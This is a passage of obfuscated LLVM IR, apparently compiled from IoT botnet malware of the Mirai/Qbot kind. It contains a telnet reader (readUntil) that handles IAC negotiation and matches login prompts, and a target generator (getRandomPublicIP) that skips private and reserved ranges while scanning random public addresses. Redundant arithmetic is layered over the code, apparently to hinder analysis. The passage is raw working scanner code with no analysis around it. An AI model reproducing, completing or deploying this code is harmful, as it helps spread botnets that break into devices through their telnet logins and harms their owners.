  %28 = sext i32 %27 to i64
  %29 = sub i64 0, -8620142522942568948
  %30 = sub i64 %29, %28
  %31 = add i64 %30, -8620142522942568948
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %80, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, -7146429040377706483
  %45 = sub i64 %44, %43
  %46 = add i64 %45, -7146429040377706483
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %80, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 0, %58
  %60 = add i64 0, %59
  %61 = sub i64 0, %58
  %62 = getelementptr inbounds i8, i8* %56, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %80, label %66

; <label>:66:                                     ; preds = %52
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = add i64 0, %73
  %75 = sub i64 0, %72
  %76 = getelementptr inbounds i8, i8* %70, i64 %74
  %77 = load i8, i8* %76, align 1
  %78 = sext i8 %77 to i32
  %79 = icmp eq i32 %78, 10
  br label %80

; <label>:80:                                     ; preds = %66, %52, %37, %22
  %81 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %79, %66 ]
  br label %82

; <label>:82:                                     ; preds = %80, %18
  %83 = phi i1 [ false, %18 ], [ %81, %80 ]
  br i1 %83, label %84, label %89

; <label>:84:                                     ; preds = %82
  %85 = load i32, i32* %7, align 4
  %86 = sub i32 0, 1
  %87 = sub i32 %85, %86
  %88 = add nsw i32 %85, 1
  store i32 %87, i32* %7, align 4
  br label %18

; <label>:89:                                     ; preds = %82
  %90 = load i8*, i8** %3, align 8
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = load i32, i32* %7, align 4
  %95 = sext i32 %94 to i64
  %96 = sub i64 0, %95
  %97 = add i64 0, %96
  %98 = sub i64 0, %95
  %99 = getelementptr inbounds i8, i8* %93, i64 %97
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i32
  %102 = load i8*, i8** %4, align 8
  %103 = load i32, i32* %6, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %101, %107
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %89
  store i32 1, i32* %2, align 4
  br label %118

; <label>:110:                                    ; preds = %89
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = load i32, i32* %6, align 4
  %113 = add i32 %112, 343478043
  %114 = add i32 %113, 1
  %115 = sub i32 %114, 343478043
  %116 = add nsw i32 %112, 1
  store i32 %115, i32* %6, align 4
  br label %11

; <label>:117:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %118

; <label>:118:                                    ; preds = %117, %109
  %119 = load i32, i32* %2, align 4
  ret i32 %119
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %164, %8
  %34 = load i32, i32* %18, align 4
  %35 = add i32 %34, 323773239
  %36 = add i32 %35, 2
  %37 = sub i32 %36, 323773239
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %165

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = xor i64 %73, -1
  %75 = xor i64 %67, -1
  %76 = xor i64 1012468197742207497, -1
  %77 = and i64 %74, 1012468197742207497
  %78 = and i64 %73, %76
  %79 = and i64 %75, 1012468197742207497
  %80 = and i64 %67, %76
  %81 = or i64 %77, %78
  %82 = or i64 %79, %80
  %83 = xor i64 %81, %82
  %84 = or i64 %74, %75
  %85 = xor i64 %84, -1
  %86 = or i64 1012468197742207497, %76
  %87 = and i64 %85, %86
  %88 = or i64 %83, %87
  %89 = or i64 %73, %67
  store i64 %88, i64* %72, align 8
  %90 = load i32, i32* %10, align 4
  %91 = sub i32 %90, 374741027
  %92 = add i32 %91, 1
  %93 = add i32 %92, 374741027
  %94 = add nsw i32 %90, 1
  %95 = call i32 @select(i32 %93, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %63
  br label %165

; <label>:98:                                     ; preds = %63
  %99 = load i8*, i8** %15, align 8
  %100 = load i32, i32* %18, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  store i8* %102, i8** %23, align 8
  %103 = load i32, i32* %10, align 4
  %104 = load i8*, i8** %23, align 8
  %105 = call i64 @recv(i32 %103, i8* %104, i64 1, i32 0)
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %19, align 4
  %107 = load i32, i32* %19, align 4
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %112, label %109

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %19, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %109, %98
  store i32 0, i32* %9, align 4
  br label %170

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* %19, align 4
  %115 = load i32, i32* %18, align 4
  %116 = add i32 %115, -95265731
  %117 = add i32 %116, %114
  %118 = sub i32 %117, -95265731
  %119 = add nsw i32 %115, %114
  store i32 %118, i32* %18, align 4
  %120 = load i8*, i8** %23, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 255
  br i1 %123, label %124, label %150

; <label>:124:                                    ; preds = %113
  %125 = load i32, i32* %10, align 4
  %126 = load i8*, i8** %23, align 8
  %127 = getelementptr inbounds i8, i8* %126, i64 1
  %128 = call i64 @recv(i32 %125, i8* %127, i64 2, i32 0)
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %19, align 4
  %130 = load i32, i32* %19, align 4
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %135, label %132

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %19, align 4
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %132, %124
  store i32 0, i32* %9, align 4
  br label %170

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* %19, align 4
  %138 = load i32, i32* %18, align 4
  %139 = sub i32 0, %138
  %140 = sub i32 0, %137
  %141 = add i32 %139, %140
  %142 = sub i32 0, %141
  %143 = add nsw i32 %138, %137
  store i32 %142, i32* %18, align 4
  %144 = load i32, i32* %10, align 4
  %145 = load i8*, i8** %23, align 8
  %146 = call i32 @negotiate(i32 %144, i8* %145, i32 3)
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %149, label %148

; <label>:148:                                    ; preds = %136
  store i32 0, i32* %9, align 4
  br label %170

; <label>:149:                                    ; preds = %136
  br label %164

; <label>:150:                                    ; preds = %113
  %151 = load i8*, i8** %15, align 8
  %152 = load i8*, i8** %11, align 8
  %153 = call i8* @strstr(i8* %151, i8* %152) #10
  %154 = icmp ne i8* %153, null
  br i1 %154, label %162, label %155

; <label>:155:                                    ; preds = %150
  %156 = load i32, i32* %12, align 4
  %157 = icmp ne i32 %156, 0
  br i1 %157, label %158, label %163

; <label>:158:                                    ; preds = %155
  %159 = load i8*, i8** %15, align 8
  %160 = call i32 @matchPrompt(i8* %159)
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158, %150
  store i32 1, i32* %20, align 4
  br label %165

; <label>:163:                                    ; preds = %158, %155
  br label %164

; <label>:164:                                    ; preds = %163, %149
  br label %33

; <label>:165:                                    ; preds = %162, %97, %51
  %166 = load i32, i32* %20, align 4
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %165
  store i32 1, i32* %9, align 4
  br label %170

; <label>:169:                                    ; preds = %165
  store i32 0, i32* %9, align 4
  br label %170

; <label>:170:                                    ; preds = %169, %168, %148, %135, %112
  %171 = load i32, i32* %9, align 4
  ret i32 %171
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4 = zext i8 %3 to i32
  %5 = icmp sge i32 %4, 255
  br i1 %5, label %6, label %24

; <label>:6:                                      ; preds = %0
  %7 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %8 = sub i8 %7, -9
  %9 = add i8 %8, 1
  %10 = add i8 %9, -9
  %11 = add i8 %7, 1
  store i8 %10, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %12 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %13 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %16 = zext i8 %15 to i32
  %17 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %18 = zext i8 %17 to i32
  %19 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %20 = zext i8 %19 to i32
  %21 = call i32 (i8*, i8*, ...) @szprintf(i8* %12, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %14, i32 %16, i32 %18, i32 %20)
  %22 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %23 = call i32 @inet_addr(i8* %22) #2
  store i32 %23, i32* %1, align 4
  br label %243

; <label>:24:                                     ; preds = %0
  %25 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp sge i32 %26, 255
  br i1 %27, label %28, label %47

; <label>:28:                                     ; preds = %24
  %29 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %30 = sub i8 0, %29
  %31 = sub i8 0, 1
  %32 = add i8 %30, %31
  %33 = sub i8 0, %32
  %34 = add i8 %29, 1
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %35 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %36 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %37 = zext i8 %36 to i32
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %41 = zext i8 %40 to i32
  %42 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %43 = zext i8 %42 to i32
  %44 = call i32 (i8*, i8*, ...) @szprintf(i8* %35, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %37, i32 %39, i32 %41, i32 %43)
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %46 = call i32 @inet_addr(i8* %45) #2
  store i32 %46, i32* %1, align 4
  br label %243

; <label>:47:                                     ; preds = %24
  %48 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %49 = zext i8 %48 to i32
  %50 = icmp sge i32 %49, 255
  br i1 %50, label %51, label %76

; <label>:51:                                     ; preds = %47
  %52 = call i32 @rand() #2
  %53 = srem i32 %52, 255
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %55 = call i32 @rand() #2
  %56 = srem i32 %55, 255
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %58 = call i32 @rand() #2
  %59 = srem i32 %58, 255
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %61 = call i32 @rand() #2
  %62 = srem i32 %61, 255
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %64 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %70 = zext i8 %69 to i32
  %71 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %72 = zext i8 %71 to i32
  %73 = call i32 (i8*, i8*, ...) @szprintf(i8* %64, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %66, i32 %68, i32 %70, i32 %72)
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %75 = call i32 @inet_addr(i8* %74) #2
  store i32 %75, i32* %1, align 4
  br label %243

; <label>:76:                                     ; preds = %47
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %78 = sub i8 0, 1
  %79 = sub i8 %77, %78
  %80 = add i8 %77, 1
  store i8 %79, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %81

; <label>:81:                                     ; preds = %217, %76
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %215, label %85

; <label>:85:                                     ; preds = %81
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 10
  br i1 %88, label %215, label %89

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 100
  br i1 %92, label %93, label %101

; <label>:93:                                     ; preds = %89
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp sge i32 %95, 64
  br i1 %96, label %97, label %101

; <label>:97:                                     ; preds = %93
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sle i32 %99, 127
  br i1 %100, label %215, label %101

; <label>:101:                                    ; preds = %97, %93, %89
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 127
  br i1 %104, label %215, label %105

; <label>:105:                                    ; preds = %101
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 169
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %105
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 254
  br i1 %112, label %215, label %113

; <label>:113:                                    ; preds = %109, %105
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 172
  br i1 %116, label %117, label %125

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp sle i32 %119, 16
  br i1 %120, label %121, label %125

; <label>:121:                                    ; preds = %117
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp sle i32 %123, 31
  br i1 %124, label %215, label %125

; <label>:125:                                    ; preds = %121, %117, %113
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 192
  br i1 %128, label %129, label %137

; <label>:129:                                    ; preds = %125
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %137

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 2
  br i1 %136, label %215, label %137

; <label>:137:                                    ; preds = %133, %129, %125
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 192
  br i1 %140, label %141, label %149

; <label>:141:                                    ; preds = %137
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 88
  br i1 %144, label %145, label %149

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 99
  br i1 %148, label %215, label %149

; <label>:149:                                    ; preds = %145, %141, %137
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 192
  br i1 %152, label %153, label %157

; <label>:153:                                    ; preds = %149
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 168
  br i1 %156, label %215, label %157

; <label>:157:                                    ; preds = %153, %149
  %158 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 198
  br i1 %160, label %161, label %169

; <label>:161:                                    ; preds = %157
  %162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 18
  br i1 %164, label %215, label %165

; <label>:165:                                    ; preds = %161
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 19
  br i1 %168, label %215, label %169

; <label>:169:                                    ; preds = %165, %157
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 198
  br i1 %172, label %173, label %181

; <label>:173:                                    ; preds = %169
  %174 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 51
  br i1 %176, label %177, label %181

; <label>:177:                                    ; preds = %173
  %178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 100
  br i1 %180, label %215, label %181

; <label>:181:                                    ; preds = %177, %173, %169
  %182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 203
  br i1 %184, label %185, label %193

; <label>:185:                                    ; preds = %181
  %186 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %189, label %193

; <label>:189:                                    ; preds = %185
  %190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 113
  br i1 %192, label %215, label %193

; <label>:193:                                    ; preds = %189, %185, %181
  %194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %195 = zext i8 %194 to i32
  %196 = icmp sge i32 %195, 224
  br i1 %196, label %215, label %197

; <label>:197:                                    ; preds = %193
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 185
  br i1 %200, label %201, label %205

; <label>:201:                                    ; preds = %197
  %202 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 62
  br i1 %204, label %215, label %205

; <label>:205:                                    ; preds = %201, %197
  %206 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 208
  br i1 %208, label %209, label %213

; <label>:209:                                    ; preds = %205
  %210 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 67
  br label %213

; <label>:213:                                    ; preds = %209, %205
  %214 = phi i1 [ false, %205 ], [ %212, %209 ]
  br label %215

; <label>:215:                                    ; preds = %213, %201, %193, %189, %177, %165, %161, %153, %145, %133, %121, %109, %101, %97, %85, %81
  %216 = phi i1 [ true, %201 ], [ true, %193 ], [ true, %189 ], [ true, %177 ], [ true, %165 ], [ true, %161 ], [ true, %153 ], [ true, %145 ], [ true, %133 ], [ true, %121 ], [ true, %109 ], [ true, %101 ], [ true, %97 ], [ true, %85 ], [ true, %81 ], [ %214, %213 ]
  br i1 %216, label %217, label %230

; <label>:217:                                    ; preds = %215
  %218 = call i32 @rand() #2
  %219 = srem i32 %218, 255
  %220 = trunc i32 %219 to i8
  store i8 %220, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %221 = call i32 @rand() #2
  %222 = srem i32 %221, 255
  %223 = trunc i32 %222 to i8
  store i8 %223, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %224 = call i32 @rand() #2
  %225 = srem i32 %224, 255
  %226 = trunc i32 %225 to i8
  store i8 %226, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %227 = call i32 @rand() #2
  %228 = srem i32 %227, 255
  %229 = trunc i32 %228 to i8
  store i8 %229, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %81

; <label>:230:                                    ; preds = %215
  %231 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %232 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %233 = zext i8 %232 to i32
  %234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %235 = zext i8 %234 to i32
  %236 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %237 = zext i8 %236 to i32
  %238 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %239 = zext i8 %238 to i32
  %240 = call i32 (i8*, i8*, ...) @szprintf(i8* %231, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %233, i32 %235, i32 %237, i32 %239)
  %241 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %242 = call i32 @inet_addr(i8* %241) #2
  store i32 %242, i32* %1, align 4
  br label %243

; <label>:243:                                    ; preds = %230, %51, %28, %6
  %244 = load i32, i32* %1, align 4
  ret i32 %244
}

; Function Attrs: nounwind
